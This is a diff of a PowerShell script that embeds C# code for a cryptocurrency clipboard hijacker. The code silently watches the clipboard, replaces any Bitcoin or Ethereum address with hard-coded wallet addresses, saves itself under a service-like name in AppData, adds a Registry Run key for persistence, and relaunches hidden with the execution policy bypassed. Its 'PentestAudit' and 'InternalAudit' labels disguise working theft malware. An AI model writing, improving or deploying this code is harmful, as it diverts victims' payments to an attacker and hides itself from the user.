@@ -1,84 +1,63 @@
-$ClipperCode = @"
+$PayloadPath = "$env:APPDATA\win_service_cache.ps1"
+
+$ClipperContent = @"
+`$C = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Text.RegularExpressions;
-
-namespace PentestAudit {
-    public class SilentMonitor : NativeWindow {
-        [DllImport("user32.dll")] private static extern bool AddClipboardFormatListener(IntPtr hwnd);
-        [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hwnd);
+namespace InternalAudit {
+    public class Stealth : NativeWindow {
+        private const uint WM_CLIP = 0x031D;
+        [DllImport("user32.dll")] private static extern bool AddClipboardFormatListener(IntPtr h);
+        [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr h);
         [DllImport("user32.dll")] private static extern bool CloseClipboard();
         [DllImport("user32.dll")] private static extern bool EmptyClipboard();
-        [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint format);
-        [DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint format, IntPtr hMem);
-        [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
-        [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr hMem);
-        [DllImport("kernel32.dll")] private static extern IntPtr GlobalAlloc(uint flags, UIntPtr bytes);
+        [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint f);
+        [DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint f, IntPtr m);
+        [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr m);
+        [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr m);
+        [DllImport("kernel32.dll")] private static extern IntPtr GlobalAlloc(uint f, UIntPtr b);
 
-        private const uint CF_UNICODETEXT = 13;
-        private const uint WM_CLIPBOARDUPDATE = 0x031D;
-        
-        // Audit Configuration: Replace with your test wallet addresses
-        private string btcAddr = "bc1qm4ls7h9jfy2l0u9sfrxjqp3vnfjp6g0cwn64vu";
-        private string ethAddr = "0x0b13bE0C7569bd057E924CdAFfA6b20aa6825a93";
+        private string btc = "bc1qcn7epnry70g4srng74qjwhnnrl5agq2jtnt70u";
+        private string eth = "0x9124856aa1567303EfBC940223356B7d5b6E1493";
 
-        private Regex btcRegex = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$");
-        private Regex ethRegex = new Regex(@"^0x[a-fA-F0-9]{40}$");
-
-        public void Start() {
-            this.CreateHandle(new CreateParams()); // Invisible window
-            AddClipboardFormatListener(this.Handle);
-        }
-
-        protected override void WndProc(ref Message m) {
-            if (m.Msg == WM_CLIPBOARDUPDATE) {
-                ProcessClipboard();
-            }
-            base.WndProc(ref m);
-        }
-
-        private void ProcessClipboard() {
+        public void Init() { this.CreateHandle(new CreateParams()); AddClipboardFormatListener(this.Handle); }
+        protected override void WndProc(ref Message m) { if (m.Msg == WM_CLIP) { try { Run(); } catch {} } base.WndProc(ref m); }
+        private void Run() {
             if (!OpenClipboard(this.Handle)) return;
-            IntPtr hData = GetClipboardData(CF_UNICODETEXT);
-            if (hData != IntPtr.Zero) {
-                IntPtr ptr = GlobalLock(hData);
-                string text = Marshal.PtrToStringUni(ptr);
-                GlobalUnlock(hData);
-                CloseClipboard();
-
-                string replacement = null;
-                if (btcRegex.IsMatch(text.Trim()) && text.Trim() != btcAddr) replacement = btcAddr;
-                else if (ethRegex.IsMatch(text.Trim()) && text.Trim() != ethAddr) replacement = ethAddr;
-
-                if (replacement != null) {
-                    WriteClipboard(replacement);
-                }
-            } else {
+            IntPtr h = GetClipboardData(13);
+            if (h == IntPtr.Zero) { CloseClipboard(); return; }
+            string t = Marshal.PtrToStringUni(GlobalLock(h));
+            GlobalUnlock(h); CloseClipboard();
+            string n = null;
+            if (Regex.IsMatch(t.Trim(), @"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$") && t.Trim() != btc) n = btc;
+            else if (Regex.IsMatch(t.Trim(), @"^0x[a-fA-F0-9]{40}$") && t.Trim() != eth) n = eth;
+            if (n != null && OpenClipboard(this.Handle)) {
+                EmptyClipboard();
+                IntPtr m = GlobalAlloc(2, (UIntPtr)((n.Length + 1) * 2));
+                Marshal.Copy(n.ToCharArray(), 0, GlobalLock(m), n.Length);
+                GlobalUnlock(m); SetClipboardData(13, m);
                 CloseClipboard();
             }
-        }
-
-        private void WriteClipboard(string text) {
-            if (!OpenClipboard(this.Handle)) return;
-            EmptyClipboard();
-            IntPtr hGlobal = GlobalAlloc(0x0002, (UIntPtr)((text.Length + 1) * 2));
-            IntPtr ptr = GlobalLock(hGlobal);
-            Marshal.Copy(text.ToCharArray(), 0, ptr, text.Length);
-            GlobalUnlock(hGlobal);
-            SetClipboardData(CF_UNICODETEXT, hGlobal);
-            CloseClipboard();
         }
     }
 }
 "@
-
-# Compile the C# in memory
-Add-Type -TypeDefinition $ClipperCode -ReferencedAssemblies "System.Windows.Forms"
-
-# Start the monitor silently in the background
-$Monitor = New-Object PentestAudit.SilentMonitor
-$Monitor.Start()
-
-# Keep the PowerShell session alive without showing a window
+Add-Type -TypeDefinition `$C -ReferencedAssemblies "System.Windows.Forms"
+`$S = New-Object InternalAudit.Stealth
+`$S.Init()
 [System.Windows.Forms.Application]::Run()
+"@
+
+# 1. Save the payload to the hidden AppData folder
+Set-Content -Path $PayloadPath -Value $ClipperContent
+
+# 2. Add to Registry for Persistence (Survivability)
+$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$RegValue = "WindowsServiceCache"
+$RegData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
+Set-ItemProperty -Path $RegPath -Name $RegValue -Value $RegData
+
+# 3. Start the process now (Decoupled from current CMD)
+Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
